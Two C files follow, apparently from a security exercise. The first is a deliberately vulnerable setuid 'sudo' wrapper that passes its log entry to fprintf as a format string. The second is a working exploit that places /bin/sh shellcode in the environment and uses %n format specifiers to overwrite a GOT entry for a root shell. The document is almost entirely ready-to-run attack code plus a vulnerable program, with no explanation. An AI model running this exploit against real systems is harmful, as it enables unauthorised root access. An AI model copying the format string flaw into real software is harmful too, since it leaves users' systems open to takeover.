// program.c (vulnerable)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int sudoexec(char *command) {
    FILE *f = NULL;
    char log_entry[64];
    char line[256];

    f = fopen("sudolog", "a");
    if (f == NULL) {
        fprintf(stderr, "Can't open sudolog file\n");
        return -1;
    }
    snprintf(log_entry, 64, "%d: %s\n", getuid(), command);

    fprintf(f, log_entry, NULL);
    fclose(f);

    f = fopen("sudoers", "r");
    if (f == NULL) {
        fprintf(stderr, "Can't open sudoers file\n");
        return -1;
    }

    while(fgets(line, 256, f) != NULL) {
        if (atoi(line) == getuid()) {
            if (setuid(0) == 0) {
                system(command);
            } else {
                fprintf(stderr, "Setting the UID to root failed: check permissions\n");
            }

            fclose(f);
            return 0;
        }
    }
    fprintf(stderr, "User not listed in the sudoers file\n");
    fclose(f);

    return -1;
}

int main (int argc, char** argv) {
    if (argv[1] == NULL) {
        fprintf(stderr, "Missing args\n");
        return -1;
    }

    if (sudoexec(argv[1]) != 0) {
        fprintf(stderr, "Cannot execute your command\n");
        return -1;
    }
    
    return 0;
}

// exploit.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define VULN "/path/to/program"

unsigned char code[] =
    "\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43"
    "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";

int main(int argc, char **argv) {
    unsigned int addr, i;

    // bfffffc0
    // readelf -r => 0804a004

    // argv[1]
    char v[] =
        "AA\x04\xa0\x04\x08"
        "\x05\xa0\x04\x08"
        "\x06\xa0\x04\x08"
        "\x07\xa0\x04\x08"
        "%168u%70$n"    // 0xc0 - 16 - 8
        "%63u%71$n"     // 0xff - 0xc0
        "%256u%72$n"    // 0x1ff - 0xff
        "%192u%73$n";   // 0x1bf - 0xff

    char *n[] = { VULN, v, NULL };
    char *env[] = { code, NULL };

    addr = 0xc0000000 - 4 - strlen(VULN) - 1 - strlen(code) - 1;
    fprintf(stderr, "Using address: %#010x\n", addr);

    execve(n[0], n, env);
    perror("execve");
    exit(1);
}

// makefile
// exploit: exploit.c
//     gcc -o exploit exploit.c
